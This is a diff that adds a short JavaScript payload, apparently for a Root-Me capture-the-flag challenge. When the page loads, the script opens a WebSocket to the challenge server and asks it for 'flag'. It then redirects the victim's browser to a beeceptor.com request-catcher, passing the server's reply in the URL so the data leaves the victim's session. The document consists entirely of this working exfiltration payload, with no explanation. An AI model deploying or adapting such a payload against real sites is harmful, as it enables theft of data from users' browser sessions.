@@ -1,0 +1,21 @@
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    var ws = new WebSocket("ws://ctf17.root-me.org/ws");
+
+    window.location = "https://toitoise2.free.beeceptor.com/?ws=" + encodeURIComponent(ws);
+
+    ws.onopen = function () {
+        ws.send("flag");
+    };
+
+    ws.onmessage = function (event) {
+        window.location = "https://toitoise2.free.beeceptor.com/?flag=" + encodeURIComponent(event.data);
+    };
+
+    ws.onerror = function () {
+        window.location = "https://toitoise2.free.beeceptor.com/?err=ws_error";
+    };
+
+});
+</script>
